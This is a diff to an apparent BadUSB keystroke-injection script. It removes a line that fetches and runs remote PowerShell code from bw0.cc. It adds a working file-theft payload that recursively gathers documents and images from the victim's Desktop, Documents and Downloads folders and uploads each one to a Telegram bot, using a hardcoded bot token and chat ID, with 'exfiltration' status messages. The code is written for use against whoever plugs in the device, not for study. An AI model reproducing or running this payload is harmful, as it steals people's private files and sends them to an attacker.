@@ -14,6 +14,32 @@ REM open powershell (remove -W Hidden to show the window)
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+STRING powershell $Token = '8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI'
+$ChatID = '6614794141'
+$BaseURL = "https://api.telegram.org/bot$Token"
+
+# Стартовое сообщение
+curl.exe "$BaseURL/sendMessage?chat_id=$ChatID&text=Starting+exfiltration"
+
+# Файлы для поиска
+$folders = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
+$extensions = @('*.txt', '*.pdf', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.jpg', '*.png', '*.log')
+
+$totalSent = 0
+foreach ($folder in $folders) {
+    foreach ($ext in $extensions) {
+        Get-ChildItem -Path $folder -Filter $ext -Recurse -File -ErrorAction 0 | ForEach-Object {
+            if ($_.Length -lt 20MB) {
+                curl.exe -s -F "chat_id=$ChatID" -F "document=@$($_.FullName)" "$BaseURL/sendDocument"
+                $totalSent++
+                Start-Sleep -Milliseconds 300
+            }
+        }
+    }
+}
+
+# Финальное сообщение
+curl.exe "$BaseURL/sendMessage?chat_id=$ChatID&text=Exfiltration+complete.+Files+sent:+$totalSent"
 ENTER
+
 
